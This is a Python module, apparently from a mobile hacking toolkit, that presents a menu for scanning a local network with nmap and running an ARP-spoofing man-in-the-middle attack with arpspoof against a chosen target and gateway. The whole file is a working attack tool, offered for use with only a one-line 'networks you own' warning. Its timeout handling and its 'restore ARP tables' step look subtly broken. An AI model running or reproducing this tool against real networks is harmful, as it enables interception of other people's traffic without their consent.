import os, sys, time, socket, struct, subprocess

GREEN = "\033[92m"; CYAN = "\033[96m"; YELLOW = "\033[93m"
RED = "\033[91m"; GRAY = "\033[90m"; RESET = "\033[0m"
BOLD = "\033[1m"; ACC = CYAN; BORDER = GREEN

def get_mac(ip):
    try:
        result = subprocess.run(
            ["ip", "neigh", "show", ip],
            capture_output=True, text=True
        )
        parts = result.stdout.split()
        if "lladdr" in parts:
            return parts[parts.index("lladdr") + 1]
    except:
        pass
    return None

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "Unknown"

def arp_scan(subnet):
    print(f"\n  {ACC}[*] Scanning {subnet} for live hosts...{RESET}\n")
    try:
        result = subprocess.run(
            ["nmap", "-sn", subnet, "--open"],
            capture_output=True, text=True, timeout=30
        )
        lines = result.stdout.split('\n')
        hosts = []
        for i, line in enumerate(lines):
            if "Nmap scan report" in line:
                ip = line.split()[-1].strip("()")
                hosts.append(ip)
                print(f"  {GREEN}[+]{RESET} {ip}")
        print(f"\n  {ACC}[*] Found {len(hosts)} hosts.{RESET}")
        return hosts
    except FileNotFoundError:
        print(f"  {RED}[!] nmap not found. Run: pkg install nmap{RESET}")
        return []
    except Exception as e:
        print(f"  {RED}[!] Error: {e}{RESET}")
        return []

def spoof_arp(target_ip, gateway_ip, iface="wlan0"):
    print(f"\n  {ACC}[*] Starting ARP spoof...{RESET}")
    print(f"  {YELLOW}[!] Requires root. Use only on networks you own.{RESET}\n")
    try:
        # Enable IP forwarding
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"],
                      capture_output=True)

        count = 0
        print(f"  {ACC}Target : {target_ip}{RESET}")
        print(f"  {ACC}Gateway: {gateway_ip}{RESET}")
        print(f"  {GRAY}Press CTRL+C to stop and restore ARP tables.{RESET}\n")

        while True:
            # Spoof target — tell target we are the gateway
            subprocess.run(
                ["arpspoof", "-i", iface, "-t", target_ip, gateway_ip],
                capture_output=True, timeout=1
            )
            # Spoof gateway — tell gateway we are the target
            subprocess.run(
                ["arpspoof", "-i", iface, "-t", gateway_ip, target_ip],
                capture_output=True, timeout=1
            )
            count += 1
            print(f"  {GRAY}[*] Packets sent: {count}{RESET}", end="\r")
            time.sleep(1)

    except KeyboardInterrupt:
        print(f"\n\n  {YELLOW}[!] Stopping — restoring ARP tables...{RESET}")
        subprocess.run(["arpspoof", "-i", iface, "-t", target_ip, gateway_ip],
                      capture_output=True)
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"],
                      capture_output=True)
        print(f"  {GREEN}[+] ARP tables restored.{RESET}")
    except FileNotFoundError:
        print(f"  {RED}[!] arpspoof not found.{RESET}")
        print(f"  {GRAY}Run: pkg install dsniff{RESET}")
    except Exception as e:
        print(f"  {RED}[!] Error: {e}{RESET}")

def run_arp_spoof():
    while True:
        local_ip = get_local_ip()
        print(f"""
{BORDER}{'─'*45}{RESET}
{ACC}{BOLD}  ARP SPOOF / MITM{RESET}
{BORDER}{'─'*45}{RESET}
  {ACC}[1]{RESET} Scan network for hosts
  {ACC}[2]{RESET} Start ARP spoofing
  {ACC}[b]{RESET} Back
{BORDER}{'─'*45}{RESET}
  {GRAY}Your IP: {local_ip}{RESET}
  {GRAY}Requires root + dsniff + nmap{RESET}""")
        choice = input(f"  {ACC}[arp]>{RESET} ").strip().lower()

        if choice == "1":
            subnet = input(f"  {GRAY}Subnet (e.g. 192.168.1.0/24): {RESET}").strip()
            if subnet: arp_scan(subnet)

        elif choice == "2":
            target = input(f"  {GRAY}Target IP: {RESET}").strip()
            gateway = input(f"  {GRAY}Gateway IP: {RESET}").strip()
            iface = input(f"  {GRAY}Interface [wlan0]: {RESET}").strip() or "wlan0"
            if target and gateway:
                spoof_arp(target, gateway, iface)

        elif choice == "b":
            break
        else:
            print(f"  {YELLOW}[!] Invalid option.{RESET}")
        input(f"\n  {GRAY}Press Enter to continue...{RESET}")
